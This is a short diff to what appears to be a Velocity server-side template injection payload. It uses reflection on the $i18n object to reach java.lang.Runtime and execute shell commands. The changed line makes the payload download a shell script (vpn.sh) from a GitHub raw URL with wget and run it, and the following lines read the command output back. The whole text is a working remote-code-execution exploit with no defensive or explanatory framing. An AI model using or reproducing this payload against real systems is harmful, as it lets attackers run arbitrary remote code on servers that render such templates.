@@ -1,4 +1,4 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('sh tmp.sh'))
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('wget https://raw.githubusercontent.com/holymaxcurl/poc/master/vpn.sh && sh vpn.sh'))
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
